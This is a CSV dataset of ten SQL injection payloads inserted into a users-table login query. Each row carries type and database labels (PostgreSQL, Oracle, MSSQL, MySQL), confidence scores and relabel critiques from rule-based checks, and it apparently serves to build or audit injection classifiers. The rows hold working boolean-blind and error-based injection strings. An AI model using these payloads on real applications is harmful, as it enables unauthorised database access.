payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\' ) as wpmv where 1479 = 1479",boolean_blind,postgresql,0.9,PostgreSQL CAST,RELABEL,reasoning too short (15 chars),boolean_blind,postgresql,36200,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\' ) as wpmv where 1479 = 1479"
"select * from users WHERE username = ""1\'+ ( select ijck where 9961 = 9961 or username = ""1%\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'""",out_of_band,oracle,0.9,Oracle CTXSYS,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,36201,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"select * from users WHERE username = ""1\'+ ( select ijck where 9961 = 9961 or username = ""1%\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'"""
"select * from users WHERE username = ""-2181\' ) and ( \'wyez\' = \'wyez"" or username = ""-2920\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,mssql,0.85,MsSQL CHAR IN,RELABEL,reasoning too short (13 chars),boolean_blind,mssql,36202,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-2181\' ) and ( \'wyez\' = \'wyez"" or username = ""-2920\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )"
"select * from users WHERE username = ""1 ) ) or username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 6723 = 6723""",boolean_blind,postgresql,0.9,PostgreSQL CAST,RELABEL,reasoning too short (15 chars),boolean_blind,postgresql,36203,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1 ) ) or username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 6723 = 6723"""
"select * from users WHERE username = ""1\' ) ) and ( ( \'rggg\' = \'rggg"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1\' )",union_based,oracle,0.95,Oracle XMLType,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'union_based' (P7),error_based,oracle,36204,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"select * from users WHERE username = ""1\' ) ) and ( ( \'rggg\' = \'rggg"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1\' )"
"select * from users WHERE username = ""1 where 5161 = 5161 and username = ""1\' ) ) and ( ( \'hbwk\' like \'hbwk""",auth_bypass,generic,0.9,Simple OR pattern,RELABEL,reasoning too short (17 chars),auth_bypass,generic,36205,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1 where 5161 = 5161 and username = ""1\' ) ) and ( ( \'hbwk\' like \'hbwk"""
"select * from users WHERE username = ""1\'|| ( select \'ftey\' where 1363 = 1363 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||\'"" or username = ""1\' ) )",polyglot,generic,0.85,ELT function polyglot,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'polyglot' (P9),boolean_blind,mysql,36206,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select * from users WHERE username = ""1\'|| ( select \'ftey\' where 1363 = 1363 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||\'"" or username = ""1\' ) )"
"select * from users WHERE username = ""-7770\' where 6503 = 6503 and username = ""1\' ) ) as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",out_of_band,oracle,0.9,Oracle CTXSYS,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,36207,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"select * from users WHERE username = ""-7770\' where 6503 = 6503 and username = ""1\' ) ) as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"""
"select * from users WHERE username = ""1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1\'|| ( select \'mgel\' where 3591 = 3591 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'""",polyglot,oracle,0.85,Oracle CTXSYS XMLType,RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'polyglot' (P9),error_based,oracle,36208,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"select * from users WHERE username = ""1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1\'|| ( select \'mgel\' where 3591 = 3591 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"""
"select * from users WHERE username = ""-7659\' ) as bowy where 4835 = 4835 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""-3582 ) where 5873 = 5873 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",out_of_band,oracle,0.9,Oracle sqlid_to_sqlhash,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,36209,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"select * from users WHERE username = ""-7659\' ) as bowy where 4835 = 4835 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""-3582 ) where 5873 = 5873 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"""
